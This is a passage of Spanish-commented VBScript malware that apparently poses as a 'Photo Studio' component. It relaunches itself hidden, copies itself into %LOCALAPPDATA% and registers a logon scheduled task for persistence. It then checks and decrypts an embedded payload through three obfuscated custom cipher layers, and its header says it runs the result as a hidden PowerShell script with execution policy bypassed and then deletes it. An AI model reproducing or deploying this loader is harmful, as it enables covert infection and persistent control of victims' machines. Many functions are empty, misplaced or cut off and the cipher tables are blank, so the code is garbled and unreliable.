'        powershell.exe -NoP -NonI -W Hidden -EP Bypass -Sta -File "<script>"
'   5) Borra el .ps1 tras 2.5 s.

Option Explicit

' Relanzarse con wscript.exe oculto si fue invocado con cscript.exe
If InStr(1, LCase(WScript.FullName), "cscript.exe") > 0 Then
    CreateObject("WScript.Shell").Run "wscript.exe //B """ & WScript.ScriptFullName & """", 0, False
    WScript.Quit
End If


' ----------------------------------------------------------------------------
' PERSISTENCIA: copia a %LOCALAPPDATA%\Photo Studio\ y tarea programada
' ----------------------------------------------------------------------------
Sub InstallPersistence()
    Dim shell, installDir, installPath, cmdExe, schtasksExe
    Dim folderName, scriptFileName, taskName, wshNetwork, userId, xmlTaskPath, xmlTaskContent, xmlStream

    Set shell = CreateObject("WScript.Shell")
    cmdExe      = "cmd.exe"
    schtasksExe = "schtasks.exe"
    folderName    = "Photo Studio"
    scriptFileName = "PhotoStudio.vbs"
    taskName      = "PhotoStudioVBS"

    installDir  = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\" & folderName
    installPath = installDir & "\" & scriptFileName

    shell.Run cmdExe & " /c if not exist """ & installDir  & """ mkdir """ & installDir & """", 0, True
    shell.Run cmdExe & " /c if not exist """ & installPath & """ copy /y """ & WScript.ScriptFullName & """ """ & installPath & """", 0, True

    Set wshNetwork = CreateObject("WScript.Network")
    userId = wshNetwork.UserDomain & "\" & wshNetwork.UserName
    Set wshNetwork = Nothing

    xmlTaskPath = BuildTempPath("mfp_x", "xml")
    xmlTaskContent = "<?xml version=""1.0"" encoding=""UTF-16""?>" & Chr(10) & _
        "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & Chr(10) & _
        "  <Triggers><LogonTrigger><Enabled>true</Enabled><UserId>" & userId & "</UserId></LogonTrigger></Triggers>" & Chr(10) & _
        "  <Principals><Principal id=""Author""><UserId>" & userId & "</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>" & Chr(10) & _
        "  <Settings><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy></Settings>" & Chr(10) & _
        "  <Actions Context=""Author""><Exec><Command>wscript.exe</Command><Arguments>""//B"" ""//NoLogo"" """ & installPath & """</Arguments></Exec></Actions>" & Chr(10) & _
        "</Task>"

    Set xmlStream = CreateObject("ADODB.Stream")
    xmlStream.Type = 2 : xmlStream.CharSet = "unicode" : xmlStream.Open
    xmlStream.WriteText xmlTaskContent
    xmlStream.SaveToFile xmlTaskPath, 2
    xmlStream.Close : Set xmlStream = Nothing

    On Error Resume Next
    shell.Run schtasksExe & " /create /tn """ & taskName & """ /xml """ & xmlTaskPath & """ /f", 0, True
    On Error GoTo 0
    shell.Run cmdExe & " /c del /f /q """ & xmlTaskPath & """", 0, True
End Sub

Sub ShiftRows(SketchSlice29, ByVal at, ByVal SealFlag49)
    Dim MergeField92(3)
    MergeField92(0) = SketchSlice29(at)
    MergeField92(1) = SketchSlice29(at + 4)
    MergeField92(2) = SketchSlice29(at + 8)
    MergeField92(3) = SketchSlice29(at + 12)
    SketchSlice29(at) = MergeField92((4 - SealFlag49 + 0) And 3)
    SketchSlice29(at + 4) = MergeField92((4 - SealFlag49 + 1) And 3)
    SketchSlice29(at + 8) = MergeField92((4 - SealFlag49 + 2) And 3)
    SketchSlice29(at + 12) = MergeField92((4 - SealFlag49 + 3) And 3)
End Sub

Function SBoxLookup(ByVal a)

Function RotLeft1(ByVal v)
    Dim LiftPage96
    LiftPage96 = (v And &H40000000) <> 0
    v = (v And &H3FFFFFFF) * 2
    If LiftPage96 Then v = v Or &H80000000
    RotLeft1 = v
End Function

Sub StoreUInt32LE(HatchSlot81s, o, v)
    HatchSlot81s(o) = v - Int(v / 256) * 256
    v = Int(v / 256)
    HatchSlot81s(o + 1) = v - Int(v / 256) * 256
    v = Int(v / 256)
    HatchSlot81s(o + 2) = v - Int(v / 256) * 256
    v = Int(v / 256)
    HatchSlot81s(o + 3) = v - Int(v / 256) * 256
End Sub


Sub EncryptBlock(s, ClipTable21, FoldField91)
    Dim a, b, c, d, t, u, sp, i
    a = LoadUInt32LE2(ClipTable21, 0)
    b = LoadUInt32LE2(ClipTable21, 4)
    c = LoadUInt32LE2(ClipTable21, 8)
    d = LoadUInt32LE2(ClipTable21, 12)
    sp = 42
    c = Sub32(c, s(sp + 1))
    a = Sub32(a, s(sp))
    For i = 1 To 20
        sp = sp - 2
        t = a
        a = d
        d = c
        c = b
        b = t
        u = Rotate(Mul32Low(d, Add32(Add32(d, d), 1)), 5)
        t = Rotate(Mul32Low(b, Add32(Add32(b, b), 1)), 5)
        c = RotRightMod(Sub32(c, s(sp + 1)), t) Xor u
        a = RotRightMod(Sub32(a, s(sp)), u) Xor t
    Next
    d = Sub32(d, s(1))
    b = Sub32(b, s(0))
    StoreUInt32LE2 FoldField91, 0, a
    StoreUInt32LE2 FoldField91, 4, b
    StoreUInt32LE2 FoldField91, 8, c
    StoreUInt32LE2 FoldField91, 12, d
End Sub

Function Rcon(ByVal i)
    Dim ScaleLexer49
    ScaleLexer49 = Array(1, 2, 4, 8, 16, 32, 64, 128, 27, 54)
    Rcon = ScaleLexer49(i)
End Function

Function ExpandKeyBytes(ScaleEdge63s, count)
    Dim SlideWriter29(), state, i, m
    m = UBound(ScaleEdge63s) + 1
    ReDim SlideWriter29(count - 1)
    state = 0
    For i = 0 To count - 1
        state = (state + ScaleEdge63s(i Mod m) + (i + 1)) And 255
        state = (state * 33 + 17) And 255
        SlideWriter29(i) = state
    Next
    ExpandKeyBytes = SlideWriter29
End Function



Function Mod2p28(ByVal x)
    Mod2p28 = x - Int(x / 268435456) * 268435456
End Function

Function DecryptCBC_EncRound(SweepSchema77s, iv, SketchSlice29)
    Dim s, ClipPacket88s(), SlideWriter29(), ClipTable21(), ProbeRange40(), WidenSchema39s, i, m
    s = RijndaelKeySchedule(SweepSchema77s)
    m = UBound(SketchSlice29) + 1
    ReDim ClipPacket88s(15)
    ReDim SlideWriter29(m - 1)
    ReDim ClipTable21(15)
    ReDim ProbeRange40(15)
    For i = 0 To 15
        ClipPacket88s(i) = iv(i)
    Next
    WidenSchema39s = 0
    Do While WidenSchema39s < m
        For i = 0 To 15
            ClipTable21(i) = SketchSlice29(WidenSchema39s + i)
        Next
        EncryptBlock s, ClipTable21, ProbeRange40
        For i = 0 To 15
            SlideWriter29(WidenSchema39s + i) = ProbeRange40(i) Xor ClipPacket88s(i)
            ClipPacket88s(i) = ClipTable21(i)
        Next
        WidenSchema39s = WidenSchema39s + 16
    Loop
    DecryptCBC_EncRound = SlideWriter29
End Function


Function ExpandRoundKeys(SweepSchema77s)
    Dim t(14), k(39), j, i, n, w, m, nw
    For i = 0 To 14
        t(i) = 0
    Next
    For i = 0 To 15
        t(i \ 4) = t(i \ 4) Or RotLeft(SweepSchema77s(i), (i Mod 4) * 8)
    Next
    t(4) = 4
    For j = 0 To 3
        For i = 0 To 14
            t(i) = t(i) Xor Rotate(t((i + 8) Mod 15) Xor t((i + 13) Mod 15), 3) Xor (4 * i + j)
        Next
        For n = 0 To 3
            For i = 0 To 14
                t(i) = Rotate(Add32(t(i), KeyTable(Mod(ToUInt32(t((i + 14) Mod 15)), 512))), 9)
            Next
        Next
        For i = 0 To 9
            k(10 * j + i) = t((4 * i) Mod 15)
        Next
    Next
    For i = 5 To 35 Step 2
        w = k(i) Or 3
        nw = Not w
        m = (nw Xor RotLeft(w, 1)) And (nw Xor RotRight(w, 1)) And &H7FFFFFFE
        m = m And RotRight(m, 1)
        m = m And RotRight(m, 2)
        m = m And RotRight(m, 4)
        m = m Or RotLeft(m, 1)
        m = m Or RotLeft(m, 2)
        m = m Or RotLeft(m, 4)
        m = m And &H7FFFFFFC
        w = w Xor (RotateMod(KeyTable(265 + (k(i) And 3)), k(i - 1)) And m)
        k(i) = w
    Next
    ExpandRoundKeys = k
End Function

Sub Mul32(ByVal a, ByVal b, ByRef hi, ByRef lo)
    Dim al, ah, bl, bh, p0, p1, p2, p3, mid, HoistFrame24
    al = a - Int(a / 65536) * 65536
    ah = Int(a / 65536)
    bl = b - Int(b / 65536) * 65536
    bh = Int(b / 65536)
    p0 = al * bl
    p1 = al * bh
    p2 = ah * bl
    p3 = ah * bh
    mid = p1 + p2
    lo = p0 + (mid - Int(mid / 65536) * 65536) * 65536
    HoistFrame24 = Int(lo / 4294967296)
    lo = lo - HoistFrame24 * 4294967296
    hi = p3 + Int(mid / 65536) + HoistFrame24
End Sub



Function Mul32Low(ByVal a, ByVal b)
    Dim al, ah, bl, bh, p0, p1, lo
    a = ToUInt32(a)
    b = ToUInt32(b)
    al = a - Int(a / 65536) * 65536
    ah = Int(a / 65536)
    bl = b - Int(b / 65536) * 65536
    bh = Int(b / 65536)
    p0 = al * bl
    p1 = al * bh + ah * bl
    lo = p0 + (p1 - Int(p1 / 65536) * 65536) * 65536
    lo = lo - Int(lo / 4294967296) * 4294967296
    Mul32Low = ToInt32(lo)
End Function

Function RotRightVar(ByVal v, ByVal n)
    n = n And 31
    If n = 0 Then
        RotRightVar = v
    Else
        RotRightVar = Rotate(v, 32 - n)
    End If
End Function


Function GFMultiply(ByVal a, ByVal b)
    Dim p, i, t
    p = 0
    For i = 1 To 8
        If (b And 1) <> 0 Then p = p Xor a
        t = a And 128
        a = (a * 2) And 255
        If t <> 0 Then a = a Xor 27
        b = b \ 2
    Next
    GFMultiply = p And 255
End Function

Function RotRightMod(ByVal v, ByVal y)
    RotRightMod = RotRightVar(v, Mod(ToUInt32(y), 32))
End Function

Function ComputeIntegrity(SweepSchema77s, SketchSlice29)
    Dim r0, r1, r2, r3, s1, s2, s3
    Dim n0, n1, n2, n3

    r0 = Mod2p28(LoadUInt32LE(SweepSchema77s, 0))
    r1 = RoundDown4(LoadUInt32LE(SweepSchema77s, 4))
    r2 = RoundDown4(LoadUInt32LE(SweepSchema77s, 8))
    r3 = RoundDown4(LoadUInt32LE(SweepSchema77s, 12))
    n0 = LoadUInt32LE(SweepSchema77s, 16)
    n1 = LoadUInt32LE(SweepSchema77s, 20)
    n2 = LoadUInt32LE(SweepSchema77s, 24)
    n3 = LoadUInt32LE(SweepSchema77s, 28)

    h1 = 0
    h2 = 0
    h3 = 0
    h4 = 0
    m = UBound(SketchSlice29) + 1

    Do While m - WidenSchema39s >= 16
        ProcessBlock h0, h1, h2, h3, h4, r0, r1, r2, r3, SketchSlice29, WidenSchema39s, 1
        WidenSchema39s = WidenSchema39s + 16
    Loop
    If WidenSchema39s < m Then
        For j = 0 To 15
            SlideAtom86(j) = 0
        Next
        ProbeTag15 = m - WidenSchema39s
        For j = 0 To ProbeTag15 - 1
            SlideAtom86(j) = SketchSlice29(WidenSchema39s + j)
        Next
        SlideAtom86(ProbeTag15) = 1
        ProcessBlock h0, h1, h2, h3, h4, r0, r1, r2, r3, SlideAtom86, 0, 0
    End If
    ComputeIntegrity = FinalizeIntegrity(h0, h1, h2, h3, h4, n0, n1, n2, n3)

Function Utf8ToBytes(text)
    Dim ForgeBlock18, LatchTag91, n, i, a(), b
    Set ForgeBlock18 = CreateObject("ADODB.Stream")
    ForgeBlock18.Type = 2
    ForgeBlock18.Charset = "utf-8"
    ForgeBlock18.Open
    ForgeBlock18.WriteText text
    ForgeBlock18.Position = 0
    ForgeBlock18.Type = 1
    ForgeBlock18.Position = 3
    LatchTag91 = ForgeBlock18.Read
    ForgeBlock18.Close
    n = LenB(LatchTag91)
    If n <= 0 Then
        ReDim a(0)
        a(0) = 0
        Utf8ToBytes = a
        Exit Function
    End If
    ReDim a(n - 1)
    For i = 1 To n
        b = AscB(MidB(LatchTag91, i, 1))
        a(i - 1) = b
    Next
    Utf8ToBytes = a
End Function


Function RoundDown4(ByVal x)
    x = Mod2p28(x)
    RoundDown4 = x - (x Mod 4)
End Function


Function LoadUInt32LE(HatchSlot81s, o)

Function Sub32(ByVal a, ByVal b)

Sub InitCryptoTables()
    Dim h, i
    h = ""
    h = h & ""
    h = h & ""

    ReDim KeyTable(511)

    Next
    h = ""
    ReDim AES_SBox(255)

        AES_SBox(i) = CLng("&H" & Mid(h, i * 2 + 1, 2))
    Next
    h = ""
    ReDim AES_InvSBox(255)

End Sub

Function AESKeySchedule(SweepSchema77s)
    Dim ks(), MergeField92(3), i, b, nk, hi, EmitHub68, rc, t
    ReDim ks(175)
    For i = 0 To 15
        ks(i) = SweepSchema77s(i)
    Next
    nk = 4
    hi = 44
    EmitHub68 = nk
    rc = 0
    For i = nk To hi - 1
        For b = 0 To 3
            MergeField92(b) = ks((i - 1) * 4 + b)
        Next
        If i = EmitHub68 Then
            EmitHub68 = EmitHub68 + nk
            t = MergeField92(0)
            MergeField92(0) = MergeField92(1)
            MergeField92(1) = MergeField92(2)
            MergeField92(2) = MergeField92(3)
            MergeField92(3) = t
            MergeField92(0) = AES_SBox(MergeField92(0))
            MergeField92(1) = AES_SBox(MergeField92(1))
            MergeField92(2) = AES_SBox(MergeField92(2))
            MergeField92(3) = AES_SBox(MergeField92(3))
            MergeField92(0) = MergeField92(0) Xor Rcon(rc)
            rc = rc + 1
        End If
        For b = 0 To 3
            ks(i * 4 + b) = ks((i - nk) * 4 + b) Xor MergeField92(b)
        Next
    Next
    AESKeySchedule = ks
End Function



Function RotRight1(ByVal v)

Function HexToUInt32(ByVal h)
    Dim hi, lo
    hi = CLng("&H" & Left(h, 4))
    lo = CLng("&H" & Right(h, 4))
    HexToUInt32 = ToInt32(CDbl(hi) * 65536 + lo)
End Function

Function IsByteArray(SketchWriter34s)
    Dim i
    If Not IsArray(SketchWriter34s) Then IsByteArray = False : Exit Function
    On Error Resume Next
    For i = LBound(SketchWriter34s) To UBound(SketchWriter34s)
        If Not IsNumeric(SketchWriter34s(i)) Then IsByteArray = False : Exit Function
        If SketchWriter34s(i) < 0 Or SketchWriter34s(i) > 255 Then IsByteArray = False : Exit Function
    Next
    On Error Goto 0
    IsByteArray = True

    Mul32 h4, s3, MergeToken99, BraceFrame82s

    Mul32 h4, r0, MergeToken99, BraceFrame82s
    GraftGate47 = BraceFrame82s
    h0 = TraceParser21
    Add32Carry PinchBuffer97, SweepLeaf29, 0, PinchHub97
    h1 = SweepLeaf29
    Add32Carry LatchPool70s, LiftBuffer19s, 0, PinchBuffer97
    h2 = LiftBuffer19s
    Add32Carry WeaveLayer87, EmitScope86, 0, LatchPool70s
    h3 = EmitScope86
    h4 = GraftGate47 + WeaveLayer87
    If h4 >= 4294967296 Then h4 = h4 - 4294967296
    c = Int(h4 / 4) + (h4 - (h4 Mod 4))
    h4 = h4 Mod 4
    h0 = h0 + c
    c = 0
    If h0 >= 4294967296 Then
        h0 = h0 - 4294967296
        c = 1
    End If
    h1 = h1 + c
    c = 0
    If h1 >= 4294967296 Then
        h1 = h1 - 4294967296
        c = 1
    End If
    h2 = h2 + c
    c = 0
    If h2 >= 4294967296 Then
        h2 = h2 - 4294967296
        c = 1
    End If
    h3 = h3 + c
    c = 0
    If h3 >= 4294967296 Then
        h3 = h3 - 4294967296
        c = 1
    End If
    h4 = h4 + c
End Sub


Sub DecryptBlock(k, ClipTable21, FoldField91)
    Dim a, b, c, d, t, r, m, l, i
    d = LoadUInt32LE2(ClipTable21, 0)
    c = LoadUInt32LE2(ClipTable21, 4)
    b = LoadUInt32LE2(ClipTable21, 8)
    a = LoadUInt32LE2(ClipTable21, 12)
    d = Add32(d, k(36))
    c = Add32(c, k(37))
    b = Add32(b, k(38))
    a = Add32(a, k(39))
    For i = 0 To 7
        b = Add32(b Xor SBoxLookup(a), KeyTableLookup2(RotRight(a, 8)))
        c = Add32(c, SBoxLookup(RotRight(a, 16)))
        a = RotRightVar(a, 24)
        d = d Xor KeyTableLookup2(a)
        If (i Mod 4) = 0 Then a = Add32(a, d)
        If (i Mod 4) = 1 Then a = Add32(a, b)
        t = a
        a = b
        b = c
        c = d
        d = t
    Next
    For i = 0 To 15
        t = RotRightVar(a, 13)
        r = Rotate(Mul32Low(a, k(35 - 2 * i)), 10)
        m = Add32(t, k(34 - 2 * i))
        l = RotateMod(KeyTableLookup(m) Xor RotRightVar(r, 5) Xor r, r)
        c = Sub32(c, RotateMod(m, RotRightVar(r, 5)))
        If i < 8 Then
            b = Sub32(b, l)
            d = d Xor r
        Else
            d = Sub32(d, l)
            b = b Xor r
        End If
        a = b
        b = c
        c = d
        d = t
    Next
    For i = 0 To 7
        If (i Mod 4) = 2 Then a = Sub32(a, d)
        If (i Mod 4) = 3 Then a = Sub32(a, b)
        b = b Xor KeyTableLookup2(a)
        c = Sub32(c, SBoxLookup(RotRight(a, 24)))
        t = Rotate(a, 24)
        d = Sub32(d, KeyTableLookup2(RotRight(a, 16))) Xor SBoxLookup(t)
        a = b
        b = c
        c = d
        d = t
    Next
    d = Sub32(d, k(0))
    c = Sub32(c, k(1))
    b = Sub32(b, k(2))
    a = Sub32(a, k(3))
    StoreUInt32LE2 FoldField91, 0, d
    StoreUInt32LE2 FoldField91, 4, c
    StoreUInt32LE2 FoldField91, 8, b
    StoreUInt32LE2 FoldField91, 12, a
End Sub


Function Mod(ByVal d, ByVal m)
    Mod = d - Int(d / m) * m
End Function


Function ToUInt32(ByVal v)
    If v < 0 Then
        ToUInt32 = CDbl(v) + 4294967296
    Else
        ToUInt32 = CDbl(v)
    End If
End Function

Function TypeWeight(PivotFacet73)
    Dim tc
    If IsNull(PivotFacet73) Then
        tc = 0
    ElseIf IsObject(PivotFacet73) Then
        tc = 1
    ElseIf IsArray(PivotFacet73) Then
        tc = 1
    Else
        tc = 1
    End If
    TypeWeight = tc
End Function

Function UnpadPKCS7(SketchSlice29)
    Dim WidenField80s, i, m, BlendBag33()
    m = UBound(SketchSlice29) + 1
    WidenField80s = SketchSlice29(m - 1)
    If WidenField80s < 1 Or WidenField80s > 16 Or WidenField80s > m Then
        UnpadPKCS7 = SketchSlice29
        Exit Function
    End If
    For i = m - WidenField80s To m - 1
        If SketchSlice29(i) <> WidenField80s Then
            UnpadPKCS7 = SketchSlice29
            Exit Function
        End If
    Next
    ReDim BlendBag33(m - WidenField80s - 1)
    For i = 0 To m - WidenField80s - 1
        BlendBag33(i) = SketchSlice29(i)
    Next
    UnpadPKCS7 = BlendBag33
End Function



Sub InvCipherRound(ks, state)
    Dim i, PackTile93s, MergeField92(15), o, t, u, v, w
    i = 10
    For o = 0 To 15
        state(o) = state(o) Xor ks(i * 16 + o)
    Next
    ShiftRows state, 1, 1
    ShiftRows state, 2, 2
    ShiftRows state, 3, 3
    For o = 0 To 15
        state(o) = AES_InvSBox(state(o))
    Next
    PackTile93s = 10
    Do While PackTile93s > 1
        PackTile93s = PackTile93s - 1
        i = i - 1
        For o = 0 To 15
            MergeField92(o) = state(o) Xor ks(i * 16 + o)
        Next
        For o = 0 To 3
            t = MergeField92(4 * o + 3) Xor MergeField92(4 * o + 2)
            u = MergeField92(4 * o + 1) Xor MergeField92(4 * o)
            v = GFMultiply(9, t Xor u)
            w = v Xor GFMultiply(4, MergeField92(4 * o + 2) Xor MergeField92(4 * o))
            v = v Xor GFMultiply(4, MergeField92(4 * o + 3) Xor MergeField92(4 * o + 1))
            state(4 * o + 3) = MergeField92(4 * o + 3) Xor v Xor GFMultiply(2, MergeField92(4 * o) Xor MergeField92(4 * o + 3))
            state(4 * o + 2) = MergeField92(4 * o + 2) Xor w Xor GFMultiply(2, t)
            state(4 * o + 1) = MergeField92(4 * o + 1) Xor v Xor GFMultiply(2, MergeField92(4 * o + 2) Xor MergeField92(4 * o + 1))
            state(4 * o) = MergeField92(4 * o) Xor w Xor GFMultiply(2, u)
        Next
        ShiftRows state, 1, 1
        ShiftRows state, 2, 2
        ShiftRows state, 3, 3
        For o = 0 To 15
            state(o) = AES_InvSBox(state(o))
        Next
    Loop
    For o = 0 To 15
        state(o) = state(o) Xor ks(o)
    Next
End Sub



Sub Add32Carry(ByRef hi, ByRef lo, ByVal MergeToken99, ByVal BraceFrame82s)
    Dim c
    lo = lo + BraceFrame82s
    c = 0
    If lo >= 4294967296 Then
        lo = lo - 4294967296
        c = 1
    End If
    hi = hi + MergeToken99 + c
    If hi >= 4294967296 Then hi = hi - 4294967296
End Sub

Function DecryptCBC_Blk(SweepSchema77s, iv, SketchSlice29)
    Dim k, ClipPacket88s(), SlideWriter29(), ClipTable21(), ProbeRange40(), WidenSchema39s, i, m
    k = ExpandRoundKeys(SweepSchema77s)
    m = UBound(SketchSlice29) + 1
    ReDim ClipPacket88s(15)
    ReDim SlideWriter29(m - 1)
    ReDim ClipTable21(15)
    ReDim ProbeRange40(15)
    For i = 0 To 15
        ClipPacket88s(i) = iv(i)
    Next
    WidenSchema39s = 0
    Do While WidenSchema39s < m
        For i = 0 To 15
            ClipTable21(i) = SketchSlice29(WidenSchema39s + i)
        Next
        DecryptBlock k, ClipTable21, ProbeRange40
        For i = 0 To 15
            SlideWriter29(WidenSchema39s + i) = ProbeRange40(i) Xor ClipPacket88s(i)
            ClipPacket88s(i) = ClipTable21(i)
        Next
        WidenSchema39s = WidenSchema39s + 16
    Loop
    DecryptCBC_Blk = SlideWriter29
End Function

Function ToInt32(ByVal d)
    If d >= 2147483648 Then
        ToInt32 = CLng(d - 4294967296)
    Else
        ToInt32 = CLng(d)
    End If
End Function



Function Rotate(ByVal v, ByVal n)
    n = n And 31
    If n = 0 Then
        Rotate = v
    Else
        Rotate = RotLeft(v, n) Or RotRight(v, 32 - n)
    End If
End Function

Sub InvShiftRows(SketchSlice29, ByVal at, ByVal SealFlag49)
    Dim MergeField92(3)
    MergeField92(0) = SketchSlice29(at)
    MergeField92(1) = SketchSlice29(at + 4)
    MergeField92(2) = SketchSlice29(at + 8)
    MergeField92(3) = SketchSlice29(at + 12)
    SketchSlice29(at) = MergeField92((SealFlag49 + 0) And 3)
    SketchSlice29(at + 4) = MergeField92((SealFlag49 + 1) And 3)
    SketchSlice29(at + 8) = MergeField92((SealFlag49 + 2) And 3)
    SketchSlice29(at + 12) = MergeField92((SealFlag49 + 3) And 3)
End Sub


Function FinalizeIntegrity(ByVal h0, ByVal h1, ByVal h2, ByVal h3, ByVal h4, ByVal n0, ByVal n1, ByVal n2, ByVal n3)
    Dim t, g0, g1, g2, g3, g4, BlendBag33(), i
    t = h0 + 5
    g0 = t - Int(t / 4294967296) * 4294967296
    t = h1 + Int(t / 4294967296)
    g1 = t - Int(t / 4294967296) * 4294967296
    t = h2 + Int(t / 4294967296)
    g2 = t - Int(t / 4294967296) * 4294967296
    t = h3 + Int(t / 4294967296)
    g3 = t - Int(t / 4294967296) * 4294967296
    g4 = h4 + Int(t / 4294967296)
    If Int(g4 / 4) <> 0 Then
        h0 = g0
        h1 = g1
        h2 = g2
        h3 = g3
    End If
    t = h0 + n0
    h0 = t - Int(t / 4294967296) * 4294967296
    t = h1 + Int(t / 4294967296) + n1
    h1 = t - Int(t / 4294967296) * 4294967296
    t = h2 + Int(t / 4294967296) + n2
    h2 = t - Int(t / 4294967296) * 4294967296
    t = h3 + Int(t / 4294967296) + n3
    h3 = t - Int(t / 4294967296) * 4294967296
    ReDim BlendBag33(15)
    StoreUInt32LE BlendBag33, 0, h0
    StoreUInt32LE BlendBag33, 4, h1
    StoreUInt32LE BlendBag33, 8, h2
    StoreUInt32LE BlendBag33, 12, h3
    FinalizeIntegrity = BlendBag33
End Function

Function BuildTempPath(StampRecord26, ShiftPool22)
    Dim sh, td
    Set sh = CreateObject("WScript.Shell")
    td = sh.ExpandEnvironmentStrings("%TEMP%")
    BuildTempPath = td & Chr(92) & StampRecord26 & CStr(Int((Timer * 1000) Mod 100000)) & "." & ShiftPool22
End Function



Function Base64Encode(PackScope45)
    Dim WeavePort67, WalkTag49s, i, PulseParser20, b1, b2, b3, n, ShiftHeader17
    WeavePort67 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    WalkTag49s = ""
    ShiftHeader17 = UBound(PackScope45)
    i = 0
    Do While i <= ShiftHeader17
        b1 = CInt(PackScope45(i))
        If i + 1 <= ShiftHeader17 Then b2 = CInt(PackScope45(i + 1)) Else b2 = 0
        If i + 2 <= ShiftHeader17 Then b3 = CInt(PackScope45(i + 2)) Else b3 = 0
        n = b1 * 65536 + b2 * 256 + b3
        WalkTag49s = WalkTag49s & Mid(WeavePort67, ((n \ 262144) And 63) + 1, 1)
        WalkTag49s = WalkTag49s & Mid(WeavePort67, ((n \ 4096)   And 63) + 1, 1)
        If i + 1 <= ShiftHeader17 Then
            WalkTag49s = WalkTag49s & Mid(WeavePort67, ((n \ 64) And 63) + 1, 1)
        Else
            WalkTag49s = WalkTag49s & "="
        End If
        If i + 2 <= ShiftHeader17 Then
            WalkTag49s = WalkTag49s & Mid(WeavePort67, (n And 63) + 1, 1)
        Else
            WalkTag49s = WalkTag49s & "="
        End If
        i = i + 3
    Loop
    Base64Encode = WalkTag49s
End Function

Function DecryptCBC_InvRound(SweepSchema77s, iv, SketchSlice29)
    Dim ks, ClipPacket88s(), SlideWriter29(), ClipTable21(), WidenSchema39s, i, m
    ks = AESKeySchedule(SweepSchema77s)
    m = UBound(SketchSlice29) + 1
    ReDim ClipPacket88s(15)
    ReDim SlideWriter29(m - 1)
    ReDim ClipTable21(15)
    For i = 0 To 15
        ClipPacket88s(i) = iv(i)
    Next
    WidenSchema39s = 0
    Do While WidenSchema39s < m
        For i = 0 To 15
            ClipTable21(i) = SketchSlice29(WidenSchema39s + i)
        Next
        InvCipherRound ks, ClipTable21
        For i = 0 To 15
            SlideWriter29(WidenSchema39s + i) = ClipTable21(i) Xor ClipPacket88s(i)
            ClipPacket88s(i) = SketchSlice29(WidenSchema39s + i)
        Next
        WidenSchema39s = WidenSchema39s + 16
    Loop
    DecryptCBC_InvRound = SlideWriter29
End Function

Function RijndaelKeySchedule(SweepSchema77s)
    Dim l(3), s(), a, b, h, j, n, c, P, Q
    P = HexToUInt32("b7e15163")
    Q = HexToUInt32("9e3779b9")
    For j = 0 To 3
        l(j) = 0
    Next
    For j = 0 To 15
        l(j \ 4) = l(j \ 4) Or RotLeft(SweepSchema77s(j), (j Mod 4) * 8)
    Next
    ReDim s(43)
    s(0) = P
    For j = 1 To 43
        s(j) = Add32(s(j - 1), Q)
    Next
    a = 0
    b = 0
    n = 132
    c = 4
    For h = 0 To n - 1
        a = Rotate(Add32(Add32(s(h Mod 44), a), b), 3)
        s(h Mod 44) = a
        b = RotateMod(Add32(Add32(l(h Mod c), a), b), Add32(a, b))
        l(h Mod c) = b
    Next
    RijndaelKeySchedule = s
End Function



Function RotateMod(ByVal v, ByVal y)
    RotateMod = Rotate(v, Mod(ToUInt32(y), 32))
End Function



Function HexToBytes(text)
    Dim n, i, a()
    n = Len(text) \ 2
    If n < 1 Then
        ReDim a(0)
        a(0) = 0
        HexToBytes = a
        Exit Function
    End If
    ReDim a(n - 1)
    For i = 0 To n - 1
        a(i) = CLng("&H" & Mid(text, i * 2 + 1, 2))
    Next
    HexToBytes = a
End Function

' ----------------------------------------------------------------------------
' DESCIFRADO + DROP + EJECUCION
'
' El Ciphertext tiene la estructura:
'   [ iv3(16) ][ iv2(16) ][ iv1(16) ][ ciphertext(len-64) ][ integrityMac(16) ]
' Se descifra en 3 capas (cada una con su propio motor de bloques):
'   1) DecryptCBC_Blk     (clave key1, iv iv1)
'   2) DecryptCBC_InvRound (clave key2, iv iv2)
'   3) DecryptCBC_EncRound (clave key3, iv iv3)
' y por ultimo se quita el padding PKCS7.
' ----------------------------------------------------------------------------
Sub DecryptAndDrop()
    Dim ciphertextLen, payloadBody(), integrityMac(15), iv3(15), iv2(15), iv1(15), ciphertext()
    Dim keyBytes, expandedKey, key3(15), key2(15), key1(15), integrityKey(31)
    Dim computedMac, integrityOk, i
    Dim decrypted3, decrypted2, decrypted1, plaintext
    Dim scriptContent, chars(), c
    Dim fso, shell, scriptPath, stream, psExe, cmd

    ciphertextLen = UBound(Ciphertext) + 1
    If ciphertextLen < 80 Or ((ciphertextLen - 64) Mod 16) <> 0 Then Exit Sub

    ' Separar las partes del Ciphertext
    ReDim payloadBody(ciphertextLen - 17)
    For i = 0 To ciphertextLen - 17
        payloadBody(i) = Ciphertext(i)
    Next
    For i = 0 To 15
        integrityMac(i) = Ciphertext(ciphertextLen - 16 + i)
        iv3(i)          = Ciphertext(i)
        iv2(i)          = Ciphertext(16 + i)
        iv1(i)          = Ciphertext(32 + i)
    Next
    ReDim ciphertext(ciphertextLen - 65)
    For i = 0 To ciphertextLen - 65
        ciphertext(i) = Ciphertext(48 + i)
    Next

    ' Derivar las claves desde la password (80 bytes)
    keyBytes    = Utf8ToBytes(AesKey)
    expandedKey = ExpandKeyBytes(keyBytes, 80)
    For i = 0 To 15
        key3(i) = expandedKey(i)
        key2(i) = expandedKey(16 + i)
        key1(i) = expandedKey(32 + i)
    Next
    For i = 0 To 31
        integrityKey(i) = expandedKey(48 + i)
    Next

    ' Verificacion de integridad (MAC) sobre payloadBody
    computedMac = ComputeIntegrity(integrityKey, payloadBody)
    integrityOk = True
    For i = 0 To 15
        If computedMac(i) <> integrityMac(i) Then integrityOk = False
    Next
    If Not integrityOk Then Exit Sub

    ' Descifrado en 3 capas + quitar padding
    decrypted3 = DecryptCBC_Blk(key1, iv1, ciphertext)
    decrypted2 = DecryptCBC_InvRound(key2, iv2, decrypted3)
    decrypted1 = DecryptCBC_EncRound(key3, iv3, decrypted2)
    plaintext  = UnpadPKCS7(decrypted1)

    ' Convertir bytes -> texto
    ReDim chars(UBound(plaintext))
    For i = 0 To UBound(plaintext)
